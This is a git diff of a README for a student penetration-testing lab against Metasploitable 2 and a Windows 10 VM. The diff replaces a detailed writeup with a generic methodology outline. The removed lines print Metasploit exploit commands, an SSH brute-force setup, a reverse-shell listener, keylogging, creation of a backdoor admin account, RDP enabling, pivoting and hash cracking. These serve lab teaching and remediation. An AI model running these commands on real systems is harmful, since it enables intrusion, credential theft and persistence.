@@ -1,317 +1,263 @@
-# 🔴 Red Team Lab Setup \& Metasploitable Full Assessment
+# Red Team Lab Assessment & Vulnerability Analysis
 
-> \*\*Author:\*\* Md. Redowanul Haq Rafi (CADS001)  
-> \*\*Date:\*\* May 15–17, 2026  
-> \*\*Classification:\*\* Educational — Controlled Lab Environment Only  
-> \*\*Tools:\*\* Kali Linux · VMware · Nmap · Metasploit · msfvenom · John the Ripper · Wireshark · Burp Suite · Proxychains
+![Cybersecurity](https://img.shields.io/badge/Cybersecurity-Ethical%20Hacking-blue)
+![Platform](https://img.shields.io/badge/Platform-VMware-green)
+![Environment](https://img.shields.io/badge/Environment-Isolated%20Lab-orange)
+![Status](https://img.shields.io/badge/Status-Completed-success)
 
-\---
+## Overview
 
-## ⚠️ Disclaimer
+This project documents a complete penetration testing engagement conducted within a controlled VMware-based lab environment. The objective was to simulate a real-world Red Team assessment by identifying, validating, and documenting security vulnerabilities across intentionally vulnerable systems.
 
-This project was conducted **entirely in an isolated virtual lab environment** for academic and educational purposes only. All targets (Metasploitable 2 and a Windows 10 VM) are intentionally vulnerable machines created for learning. **Never use these techniques on systems you do not own or have explicit written permission to test. Unauthorized penetration testing is illegal.**
+The assessment followed a structured penetration testing methodology including reconnaissance, enumeration, vulnerability validation, post-exploitation analysis, network pivoting, and remediation planning.
 
-\---
+All activities were performed in an isolated laboratory environment for educational and defensive security purposes only.
 
-## 📋 Project Overview
+---
 
-This project demonstrates a full Red Team penetration test cycle — from building the lab to achieving complete system compromise — using professional tools and techniques used in real-world security assessments.
+## Project Objectives
 
-**Three virtual machines** were configured in VMware:
+- Design and deploy a personal cybersecurity lab
+- Perform network reconnaissance and service enumeration
+- Identify security vulnerabilities across target systems
+- Validate discovered vulnerabilities in a controlled environment
+- Demonstrate post-exploitation techniques
+- Conduct internal network pivoting
+- Analyze network traffic and authentication mechanisms
+- Perform password security assessments
+- Document findings and provide remediation recommendations
 
-|Machine|Role|IP Address|
-|-|-|-|
-|Kali Linux|Attacker|192.168.50.2 (VLan1) / 192.168.78.131 (NAT)|
-|Metasploitable 2|Primary Target|192.168.50.3 (eth0) / 10.10.10.5 (eth1)|
-|Windows 10|Secondary Target|10.10.10.x (VLan2)|
+---
 
-\---
+## Lab Environment
 
-## 🏗️ Lab Architecture
+### Virtual Machines
 
-```
-\[ KALI LINUX ATTACKER ]
-   192.168.50.2 (VLan1)
-   192.168.78.131 (NAT - for payload delivery)
-         |
-         | VLan1 (192.168.50.0/24)
-         |
-\[ METASPLOITABLE 2 ]  ←── Primary Target
-   eth0: 192.168.50.3  (reachable from Kali)
-   eth1: 10.10.10.5    (internal pivot network)
-         |
-         | VLan2 (10.10.10.0/24)  ←── Pivot Network
-         |
-\[ WINDOWS 10 ]  ←── Secondary Target (only reachable via pivot)
-   10.10.10.x
-```
+| Machine | Role |
+|----------|----------|
+| Kali Linux | Attacker Machine |
+| Metasploitable 2 | Primary Target |
+| Windows 10 | Secondary Target |
 
-> \*\*Pivoting Note:\*\* Kali cannot directly reach Windows (10.10.10.x). Traffic is routed \*\*through Metasploitable\*\* using Proxychains + Meterpreter routing.
->
-> \*\*Payload Delivery Note:\*\* When delivering payloads to Windows, Kali's network adapter was switched to \*\*NAT (VMnet8)\*\* to get internet/host connectivity. LHOST was set to `192.168.78.131`.
+### Network Design
 
-\---
+The environment consisted of multiple isolated virtual networks connected through a dual-homed target system. This configuration allowed the simulation of internal network access, segmentation, and pivoting scenarios commonly encountered during enterprise security assessments.
 
-## 🎯 Project Objectives
+---
 
-* \[x] Set up a personal Red Team Lab environment in VMware
-* \[x] Configure Kali Linux and Metasploitable 2
-* \[x] Configure a Windows 10 machine as a secondary pivot target
-* \[x] Perform full target enumeration (Nmap + Metasploit)
-* \[x] Identify vulnerabilities across all services
-* \[x] Exploit each vulnerable service
-* \[x] Achieve root/SYSTEM access on both targets
-* \[x] Perform post-exploitation (keylogging, backdoor, RDP)
-* \[x] Demonstrate network pivoting to internal network
-* \[x] Crack password hashes offline
-* \[x] Capture network traffic (Wireshark + Burp Suite)
-* \[x] Document findings with remediation recommendations
+## Assessment Methodology
 
-\---
+### 1. Reconnaissance
 
-## 🔍 Enumeration Summary
+Information gathering and identification of accessible systems and services.
 
-All scans used `nmap -p \[PORT] -A \[TARGET\_IP]`:
+Activities included:
 
-|Port|Service|Version|Key Finding|
-|-|-|-|-|
-|21|FTP|vsFTPd 2.3.4|Anonymous login + Known backdoor|
-|22|SSH|OpenSSH|Weak credentials (brute forced)|
-|23|Telnet|Linux telnetd|Plaintext protocol — creds sniffable|
-|80|HTTP|Apache 2.2.8|Outdated, WebDAV enabled, vulnerable apps|
-|445|SMB|Samba 3.0.20|RCE vulnerability, signing disabled|
-|3306|MySQL|MySQL 5.0.51a|No root password, exposed on network|
-|80 (Win)|HTTP|Rejetto HFS|CVE-2024-23692 RCE|
+- Host Discovery
+- Port Scanning
+- Service Enumeration
+- Version Detection
+- Banner Grabbing
 
-\---
+---
 
-## 💥 Exploitation Summary
+### 2. Vulnerability Assessment
 
-### 1\. FTP — vsFTPd 2.3.4 Backdoor (CVE-2011-2523)
+Identified vulnerabilities were analyzed and validated.
 
-```
-use exploit/unix/ftp/vsftpd\_234\_backdoor
-set RHOSTS 192.168.50.3
-set LHOST 192.168.50.2
-exploit
-```
+Examples included:
 
-**Result:** Root shell on Metasploitable ✅
+- Weak Authentication
+- Outdated Services
+- Insecure Protocols
+- Misconfigurations
+- Exposed Administrative Access
+- Remote Code Execution Vulnerabilities
 
-\---
+---
 
-### 2\. SSH — Brute Force Attack
+### 3. Exploitation Validation
 
-```
-use auxiliary/scanner/ssh/ssh\_login
-set RHOSTS 192.168.50.3
-set USER\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_users.txt
-set PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt
-set STOP\_ON\_SUCCESS true
-run
-```
+Validated discovered vulnerabilities within the controlled environment to determine their impact and risk level.
 
-**Result:** Credentials cracked → SSH login as msfadmin ✅
+Activities included:
 
-\---
+- Service Exploitation
+- Credential Attacks
+- Remote Access Validation
+- Privilege Escalation Testing
 
-### 3\. SMB — Samba usermap\_script (CVE-2007-2447)
+---
 
-```
-use exploit/multi/samba/usermap\_script
-set RHOSTS 192.168.50.3
-exploit
-```
+### 4. Post-Exploitation Analysis
 
-**Result:** Root shell via Samba command injection ✅
+After successful access, additional security weaknesses were evaluated.
 
-\---
+Activities included:
 
-### 4\. Telnet — Default Credentials
+- Privilege Verification
+- User Enumeration
+- System Information Gathering
+- Persistence Demonstration
+- Access Control Evaluation
 
-```bash
-telnet 192.168.50.3
-# Username: msfadmin
-# Password: msfadmin
-```
+---
 
-**Result:** Full shell access via Telnet ✅
+### 5. Network Pivoting
 
-\---
+Demonstrated the ability to access internal network segments through compromised hosts.
 
-### 5\. MySQL — No Root Password
+Activities included:
 
-```bash
-mysql -h 192.168.50.3 -u root
-# No password required
-```
+- Route Configuration
+- Internal Host Discovery
+- Segmented Network Assessment
+- Controlled Traffic Forwarding
 
-**Result:** Full database access with root privileges ✅
+---
 
-\---
+### 6. Traffic Analysis
 
-### 6\. Windows — Rejetto HFS RCE (CVE-2024-23692)
+Network traffic was captured and analyzed to identify insecure communications.
 
-```
-# Step 1: Switch Kali to NAT → get IP 192.168.78.131
-# Step 2: Set up listener
-use multi/handler
-set payload windows/x64/meterpreter/reverse\_tcp
-set LHOST 192.168.78.131
-set LPORT 4488
-run
+Activities included:
 
-# Step 3: Run exploit
-use exploit/windows/http/rejetto\_hfs\_rce\_cve\_2024\_23692
-set RHOSTS \[Windows IP]
-exploit
-```
+- Protocol Analysis
+- Credential Exposure Testing
+- HTTP Traffic Inspection
+- Packet Inspection
 
-**Result:** Meterpreter session on Windows SYSTEM ✅
+---
 
-\---
+## Key Findings
 
-## 🔑 Post-Exploitation (Windows)
+The assessment identified several high-risk security issues including:
 
-After getting Meterpreter on Windows:
+- Weak Authentication Mechanisms
+- Legacy and Outdated Services
+- Insecure Protocol Usage
+- Misconfigured Services
+- Remote Code Execution Risks
+- Excessive Privileges
+- Weak Password Policies
+- Lack of Network Segmentation
+- Exposure of Sensitive Information
 
-```bash
-# Keylogging
-keyscan\_start
-keyscan\_dump        # See all typed text
-keyscan\_stop
-screenshot          # Capture victim's screen
+---
 
-# Create Backdoor Admin Account
-shell
-net user Backdoor Pa$$w0rd123 /add
-net localgroup administrators Backdoor /add
-net localgroup "Remote Desktop Users" Backdoor /add
+## Tools Used
 
-# Enable RDP
-reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f
-netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
-```
+### Operating Systems
 
-\---
+- Kali Linux
+- Metasploitable 2
+- Windows 10
 
-## 🔄 Network Pivoting
+### Security Tools
 
-To reach the Windows machine (10.10.10.x) which Kali cannot directly access:
+- Nmap
+- Metasploit Framework
+- Wireshark
+- Burp Suite
+- John the Ripper
+- Proxychains
+- VMware Workstation
 
-```bash
-# 1. Get Meterpreter session on Metasploitable (via FTP exploit)
-# 2. In Metasploit: add route through session
-route add 10.10.10.0/24 \[SESSION\_ID]
+---
 
-# 3. Use proxychains to scan through pivot
-proxychains -q nmap -sT -Pn 10.10.10.5
-```
+## Skills Demonstrated
 
-**Result:** Full port scan of internal Windows machine via Metasploitable pivot ✅
+### Networking
 
-\---
+- TCP/IP Fundamentals
+- Network Segmentation
+- Routing Concepts
+- Service Discovery
+- Packet Analysis
 
-## 🔐 Password Cracking
+### Cybersecurity
 
-```bash
-# Crack NT hashes from Windows using John the Ripper
-john --format=NT Hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+- Vulnerability Assessment
+- Penetration Testing
+- Exploitation Validation
+- Privilege Escalation
+- Post-Exploitation Analysis
+- Password Auditing
+- Network Pivoting
+- Security Documentation
 
-# Cracked:
-# Admin : Pa$$w0rd123
-```
+### Documentation & Reporting
 
-\---
+- Technical Reporting
+- Risk Assessment
+- Security Recommendations
+- Vulnerability Documentation
 
-## 🌐 Network Sniffing
+---
 
-### Wireshark
+## Project Deliverables
 
-* Captured plaintext Telnet credentials on eth0 (VLan1)
-* Applied display filter: `telnet` or `ftp`
-* Used "Follow TCP Stream" to see full credential exchange
+- Lab Environment Design
+- Assessment Documentation
+- Vulnerability Analysis
+- Evidence Collection
+- Security Findings Report
+- Remediation Recommendations
 
-### Burp Suite
+---
 
-* Configured browser proxy to 127.0.0.1:8080
-* Intercepted HTTP requests to Metasploitable web apps
-* Analyzed POST parameters for credentials and injection points
+## Learning Outcomes
 
-\---
+Through this project I gained hands-on experience in:
 
-## 🚨 Key Vulnerabilities Found
+- Building Cybersecurity Labs
+- Ethical Hacking Methodology
+- Vulnerability Assessment
+- Enterprise Security Concepts
+- Internal Network Assessment
+- Security Tool Usage
+- Security Reporting
+- Defensive Security Awareness
 
-|#|Vulnerability|Severity|Status|
-|-|-|-|-|
-|1|vsFTPd 2.3.4 Backdoor (CVE-2011-2523)|🔴 CRITICAL|Exploited|
-|2|Anonymous FTP Login|🟠 HIGH|Confirmed|
-|3|SSH Weak Credentials|🟠 HIGH|Exploited|
-|4|Telnet — Plaintext Protocol|🟠 HIGH|Exploited|
-|5|Samba 3.0.20 RCE (CVE-2007-2447)|🔴 CRITICAL|Exploited|
-|6|SMB Signing Disabled|🟡 MEDIUM|Confirmed|
-|7|Apache 2.2.8 — Outdated|🟠 HIGH|Enumerated|
-|8|MySQL — No Root Password|🔴 CRITICAL|Exploited|
-|9|Rejetto HFS RCE (CVE-2024-23692)|🔴 CRITICAL|Exploited|
-|10|Weak Windows Admin Password|🟠 HIGH|Cracked|
-|11|Keylogging — No EDR|🔴 CRITICAL|Exploited|
-|12|Backdoor Account + RDP|🔴 CRITICAL|Exploited|
-|13|Network Pivoting via Dual-homed Host|🟠 HIGH|Exploited|
-|14|Plaintext Traffic (Telnet/FTP)|🟠 HIGH|Confirmed|
+---
 
-\---
+## Repository Contents
 
-## 🛡️ Remediation Recommendations
-
-|Service|Fix|
-|-|-|
-|FTP|Upgrade vsFTPd, disable anonymous login, switch to SFTP|
-|SSH|Use key-based auth only, disable password auth, deploy fail2ban|
-|Telnet|**Disable completely** — replace with SSH|
-|SMB|Upgrade Samba, enable SMB signing, block 445 at firewall|
-|HTTP|Upgrade Apache, disable WebDAV, deploy WAF, use HTTPS|
-|MySQL|Set root password, block port 3306 from network, upgrade|
-|Windows|Patch HFS, install EDR, enforce strong passwords, enable Defender|
-|Network|Segment VLANs, deploy IDS/IPS, block pivoting routes|
-
-\---
-
-## 🛠️ Tools Used
-
-|Tool|Purpose|
-|-|-|
-|VMware Workstation|Lab virtualization|
-|Kali Linux|Attacker OS|
-|Nmap|Port scanning \& service enumeration|
-|Metasploit Framework|Exploitation framework|
-|msfvenom|Payload generation|
-|John the Ripper|Password hash cracking|
-|Wireshark|Network packet capture|
-|Burp Suite|HTTP traffic interception|
-|Proxychains|Network pivoting tunnel|
-
-\---
-
-## 📁 Project Structure
-
-```
-Project/
-├── Lab_Environment_Setup/   # VMware setup, network config screenshots
-├── FTP/                     # vsFTPd enumeration & exploitation
-├── SSH/                     # SSH brute force & login
-├── Telnet/                  # Telnet exploitation
-├── SMB/                     # Samba enumeration & exploitation
-├── HTTP/                    # Apache & web app exploitation
-├── MySql/                   # MySQL enumeration & access
-├── Password Cracking/       # John the Ripper hash cracking
-├── Pivoting/                # Proxychains & network pivoting
-├── Windows_Payload/         # Windows payload, post-exploitation
-├── Windows HFS/             # HFS exploit, post-exploitation
-├── Sniffing/                # Wireshark packet capture
-└── Sniffing with burp/      # Burp Suite HTTP interception
+```text
+.
+├── Lab_Setup_Overview.png
+├── Project_Tasks_Part1.rar
+├── Project_Tasks_Part2.rar
+├── RedTeam_Project_Report.pdf
+└── README.md
 ```
 
-\---
+---
 
-*This project was completed as part of an Ethical Hacking \& Penetration Testing course. All activities were conducted in a controlled, isolated lab environment.*
+## Author
 
+### Md. Redowanul Haq Rafi
+
+Cybersecurity Learner | Penetration Testing Enthusiast | Aspiring Network & Security Engineer
+
+### Areas of Interest
+
+- Cybersecurity
+- Ethical Hacking
+- Penetration Testing
+- Network Security
+- Routing & Switching
+- Cloud Security
+- Security Operations
+
+---
+
+## Professional Disclaimer
+
+This repository is intended strictly for educational, research, and defensive security purposes.
+
+All activities were conducted on intentionally vulnerable virtual machines inside a fully isolated laboratory environment owned and controlled by the author.
+
+No testing was performed against public systems, third-party infrastructure, or unauthorized targets.
+
+The purpose of this project is to demonstrate cybersecurity concepts, penetration testing methodologies, security analysis, and remediation practices in a safe and legal environment.
